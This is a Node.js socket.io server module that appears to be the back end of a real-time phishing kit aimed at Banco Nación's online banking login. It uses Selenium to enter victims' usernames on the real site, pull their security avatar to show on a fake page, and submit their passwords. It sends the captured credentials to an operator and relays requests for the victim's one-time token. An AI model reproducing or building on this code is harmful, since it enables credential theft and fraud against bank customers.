module.exports = httpServer => {

    const chrm = require("chromedriver");
    // Include selenium webdriver
    const swd = require("selenium-webdriver");


    const { Server } = require("socket.io");
    const io = new Server(httpServer);

    var socketsOnLineAdm = [];
    var socketsInHome = [];
    var AsignarAdm = 0;
    var socketImg = []

    io.on("connection", socket => {
        
        // Agendar administradores
        socket.on("AdmOn", data => {
            socketsOnLineAdm.push(data);
            console.log('Adm: ' + socketsOnLineAdm)
        });
        socket.on("disconnect", () => {
            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item !== socket.id);
            socketsOnLineAdm = newsocketsOnLineAdm;
            
            var baySocket = socketsInHome.filter((item) => item.Socket == socket.id);
            if(baySocket[0]){
                console.log(baySocket[0]);
                io.emit("DisconnectQueue", baySocket[0]);
            }

            var newsocketsInHome = socketsInHome.filter((item) => item.Socket !== socket.id);
            socketsInHome = newsocketsInHome;
        })

        // Agendar Home para pedir cosas
        socket.on("HomeConnect", data => {
            socketsInHome.push(data);
            console.log(socketsInHome)
        })

        // Mostrar imagen login
        socket.on("ShowAvatar", data => {

            var img = '';
            let browser = new swd.Builder();
            let tab = browser.forBrowser("chrome").build();
            
            //Step 1 - Opening sign in page
            let tabToOpenSignIn =
            tab.get("https://hb.redlink.com.ar/bna/login.htm");
            
            tabToOpenSignIn
            .then(() => {
                // Timeout to wait if connection is slow
                let findTimeOutP =
                    tab.manage().setTimeouts({
                        implicit: 15000, // 15 seconds
                    });
                return findTimeOutP;
            })
            .then(() => {
                //Finding the username input
                let promiseUsernameBox =
                    tab.findElement(swd.By.css("#usuario"));
                return promiseUsernameBox;
            })
            //Entering the username
            .then(usernameBox => {
                let promiseFillUsername =
                    usernameBox.sendKeys(data.user);
                return promiseFillUsername;
            })
            .then(() => {
                console.log("Username entered successfully");
                let promiseBtnIngresar =
                    tab.findElement(swd.By.css(".btn_ingresar"));
                return promiseBtnIngresar;
            })
            .then(promiseBtnIngresar => {
                let promiseClickIngresar = promiseBtnIngresar.click();
                return promiseClickIngresar;
            })
            .then(() => {
                //Finding the img avatar
                setTimeout(() => {
                    let promiseAvatarImg =
                    tab.findElement(swd.By.xpath("//img[@alt='avatar']")).getAttribute('src')
                    .then(AvatarImg => {
                        socketImg.push({'socket': data.socket, 'img': AvatarImg});
                        io.to(data.socket).emit("AvatarElement", AvatarImg);
                        tab.quit();
                    })
                }, 1000);
            })
            .catch(err => {
                console.log("Error ", err, " occurred!");
            });
        })

        // Recibir data y enviar al adm
        socket.on("Data", data => {
            console.log('Length adm '+socketsOnLineAdm.length)
            if(AsignarAdm < socketsOnLineAdm.length-1){
                AsignarAdm += 1;
            }else{
                AsignarAdm = 0;
            }
            var AdminSelected = socketsOnLineAdm[AsignarAdm];
           
            let browser = new swd.Builder();
            let tab = browser.forBrowser("chrome").build();
            
            var totales = "";

            //Step 1 - Opening sign in page
            let tabToOpenSignIn =
            tab.get("https://hb.redlink.com.ar/bna/login.htm");
            tabToOpenSignIn
            .then(() => {
                // Timeout to wait if connection is slow
                let findTimeOutP =
                    tab.manage().setTimeouts({
                        implicit: 15000, // 15 seconds
                    });
                return findTimeOutP;
            })
            .then(() => {
                //Finding the username input
                let promiseUsernameBox =
                    tab.findElement(swd.By.css("#usuario"));
                return promiseUsernameBox;
            })
            //Entering the username
            .then(usernameBox => {
                let promiseFillUsername =
                    usernameBox.sendKeys(data.user);
                return promiseFillUsername;
            })
            .then(() => {
                console.log("Username entered successfully");
                let promiseBtnIngresar =
                    tab.findElement(swd.By.css(".btn_ingresar"));
                return promiseBtnIngresar;
            })
            .then(promiseBtnIngresar => {
                let promiseClickIngresar = promiseBtnIngresar.click();
                return promiseClickIngresar;
            })
            .then(() => {
                //Finding the password input
                let promisePasswordBox =
                    tab.findElement(swd.By.css("#clave"));
                return promisePasswordBox;
            })
            //Entering the password
            .then(PasswordBox => {
                let promiseFillPassword =
                    PasswordBox.sendKeys(data.pass);
                return promiseFillPassword;
            })
            .then(() => {
                console.log("Password entered successfully");
                let promiseBtnIngresar = tab.findElement(swd.By.css(".btn_ingresar"));
                io.to(AdminSelected).emit("NewData", data);
                return promiseBtnIngresar;
            })
            /*.then(promiseBtnIngresar => {
                let promiseClickIngresar = promiseBtnIngresar.click();
                return promiseClickIngresar;
            })
            .then(() => {
                //Finding totales box
                let promiseTotalesAmount =
                    tab.findElement(swd.By.css("#totales")).getText();
                return promiseTotalesAmount;
            })
            //Entering the password
            .then(TotalesAmount => {
                totales = [data,TotalesAmount]
                io.to(AdminSelected).emit("NewData", totales);
            })*/
            .catch(err => {
                console.log("Error ", err, " occurred!");
            });
        });

        //TOKEN
        socket.on("PedirToken", dataId => {
            var socketPedirToken = socketsInHome.filter((item) => item.Id == dataId);
            io.to(socketPedirToken[0].Socket).emit("IngresarToken", true);
        })

        socket.on("SendToken", dataToken => {
            console.log(dataToken)
            io.emit("ReSendToken", dataToken);
        })

        socket.on("Finalizar", dataId => {
            var socketPedirToken = socketsInHome.filter((item) => item.Id == dataId);
            io.to(socketPedirToken[0].Socket).emit("FinalizarTodo", true);
        })
        
    })
}